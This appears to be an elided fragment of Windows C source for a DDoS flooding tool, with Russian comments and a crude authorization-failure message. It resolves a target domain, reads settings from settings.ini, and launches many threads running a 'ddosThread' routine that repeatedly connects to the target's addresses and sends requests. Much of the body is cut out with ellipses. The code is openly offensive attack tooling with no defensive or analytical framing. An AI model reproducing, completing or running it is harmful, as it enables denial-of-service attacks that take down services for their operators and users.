...
int replaceRand(char* szString)
{
	...
	return 1;
										...
										// Rev1, 110911
unsigned int __stdcall ddosThread(void* param)
{
	...
	while (++iCurrent)
	{
		...
		if (connect(s, (struct sockaddr*)&gsSockAddrs[iIpIdx], sizeof(struct sockaddr_in)) == SOCKET_ERROR)
		{
			WaitForSingleObject(gMutex, INFINITE);
		...
		else
		{
			...
			pReqLen = strlen(szRequest);
			
															
			if (send(s, (char*)&szRequest, pReqLen, 0) == SOCKET_ERROR)
...
int main(int argc, char* argv[])
{
	...
	srand(time(NULL));
										// Получаем адрес файла настроек

	GetModuleFileName(GetModuleHandle(NULL), (char*)&myfile, sizeof(myfile));
	sIndex = (char*)&myfile + strlen(myfile) - 1;
	while (*(--sIndex) != '\\');
	*sIndex = 0;
	strcat((char*)&myfile, "\\settings.ini");
	...
	if (FAILED(WSAStartup(MAKEWORD(1, 1), &dummy)))
	{
		printf("Error during WSA initializing!\n");
		_getch();
		return 0;
	}
...
#if defined(API_AUTHORIZATION) || defined(VATAKU_AUTHORIZATION)
	apiRes = apiAuthorization(gsApiHash);
	if (apiRes <= 0)
	{
		printf("API authorization failed (error %d). Suck my dick.\n", apiRes);
		_getch();
		return 0;
	}
#endif
	...
	{
		IN_ADDR saddr;
		saddr.S_un.S_addr = * (DWORD*)hDomainData->h_addr_list[i];
		printf("%s\n             ", inet_ntoa(saddr));
	...
	while (hDomainData->h_addr_list[tmp++] != 0)
	{
		...
		gsSockAddrs[tmp - 1].sin_addr.S_un.S_addr = * (DWORD*)hDomainData->h_addr_list[tmp - 1];
	}

	gMutex = CreateMutex(NULL, 0, NULL);
	for (i = 0; i < gsThreads; i++)
	{
		_beginthreadex(NULL, 0, &ddosThread, NULL, 0, NULL);
	}
	Sleep(INFINITE);
	_getch();
	return 0;
